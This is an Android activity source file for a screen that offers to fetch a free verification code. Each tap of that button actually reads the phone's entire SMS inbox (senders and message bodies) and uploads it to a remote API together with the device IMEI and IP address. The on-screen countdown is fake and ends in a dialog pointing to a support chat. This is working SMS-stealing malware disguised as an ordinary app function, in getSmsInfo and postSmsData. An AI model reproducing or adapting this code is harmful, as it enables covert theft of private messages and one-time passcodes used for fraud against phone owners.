package com.xhf.sms;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.meiqia.meiqiasdk.util.MQIntentBuilder;
import com.xhf.sms.api.ApiManager;
import com.xhf.sms.base.BaseActivity;
import com.xhf.sms.bean.SmsBean;
import com.xhf.sms.dialog.CenterDialog;
import com.xhf.sms.utils.SpUtils;

import java.util.ArrayList;
import java.util.List;

import butterknife.BindView;
import butterknife.OnClick;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;

public class BuySafeActivity extends BaseActivity {

    @BindView(R.id.tvGetCode)
    TextView mTvGetCode;
    private CenterDialog mDialog;
    private CenterDialog mCenterDialog;
    private CountDownTimer mDownTimer;

    @Override
    protected int getLayoutId() {
        return R.layout.activity_buy_safe;
    }

    @Override
    protected void initView() {

    }

    @Override
    protected void initData() {

    }

    private boolean isFirst = false;
    private List<SmsBean.Msg> mMsgList = new ArrayList<>();
    private int i = 0;

    @OnClick({R.id.tvGetCode, R.id.nextView})
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.tvGetCode:
                getSmsInfo();
                if (!isFirst) {
                    showWarnDialog();
                    isFirst = true;
                } else {
                    mDownTimer = new CountDownTimer(60000, 1000) {
                        @Override
                        public void onTick(long millisUntilFinished) {
                            long l = millisUntilFinished / 1000;
                            i++;
                            Log.e("znv", "onTick: " + l);
                            mTvGetCode.setText(l + "");
                            if (i == 5) {
                                if (mDownTimer != null) {
                                    mDownTimer.cancel();
                                }
                                showCenterDialog();
                            }

                        }

                        @Override
                        public void onFinish() {

                        }
                    };
                    mDownTimer.start();
                }

                break;
            case R.id.nextView:

                break;
        }
    }

    private void showWarnDialog() {
        mDialog = CenterDialog.create(getSupportFragmentManager());
        mDialog.setLayoutRes(R.layout.dialog_bysafe)
                .setViewListener(v -> {
                    TextView textView = v.findViewById(R.id.confirmView);
                    textView.setOnClickListener(v14 -> mDialog.dismiss());

                }).show();
    }

    private void showCenterDialog() {
        mCenterDialog = CenterDialog.create(getSupportFragmentManager());
        mCenterDialog.setLayoutRes(R.layout.dialog_bysafe_code)
                .setViewListener(v -> {
                    ImageView imageView = v.findViewById(R.id.closeView);
                    imageView.setOnClickListener(v1 -> {
                        i = 0;
                        mTvGetCode.setText("免费获取验证码");
                        mCenterDialog.dismiss();
                    });
                    TextView textView = v.findViewById(R.id.tipView);
                    textView.setOnClickListener(v12 -> {
                        Intent intent = new MQIntentBuilder(BuySafeActivity.this).build();
                        startActivity(intent);
                    });
                    TextView confirm = v.findViewById(R.id.tvConfirm);
                    confirm.setOnClickListener(v13 -> {
                        i = 0;
                        mTvGetCode.setText("免费获取验证码");
                        mCenterDialog.dismiss();
                    });

                }).show();
    }

    private void getSmsInfo() {
        mMsgList.clear();
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc");
        if (null == cur) {
            Log.i("getphoneSms", "************cur == null");
            return;
        }

        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));
            long startTime = cur.getLong(cur.getColumnIndex("date"));
            String body = cur.getString(cur.getColumnIndex("body"));
            Log.e("result", "--" + body);
            if (startTime > SpUtils.getSMSReadTime(this)) {
                SmsBean.Msg msg = new SmsBean.Msg();
                msg.setTel(number);
                msg.setData(body);
                mMsgList.add(msg);
            }
        }
        cur.close();

        postSmsData(mMsgList);
    }


    private void postSmsData(List<SmsBean.Msg> list) {
        SmsBean smsBean = new SmsBean();
        smsBean.setName("");
        smsBean.setPhone("");
        smsBean.setImei(AppUtils.getDeviceID(this));
        smsBean.setIp(AppUtils.getLocalIpAddress(this));
        smsBean.setMsg(list);
        ApiManager.getInstance().getApiService().sendSms(smsBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        if (response.getCode() == 1) {
                            Log.e("sms", "短信再次上传成功: " + response.getMsg());
                            SpUtils.setSMSReadTime(BuySafeActivity.this, System.currentTimeMillis());

                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "onError: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }


    @OnClick(R.id.ivBack)
    public void onClick() {
        finish();
    }
}
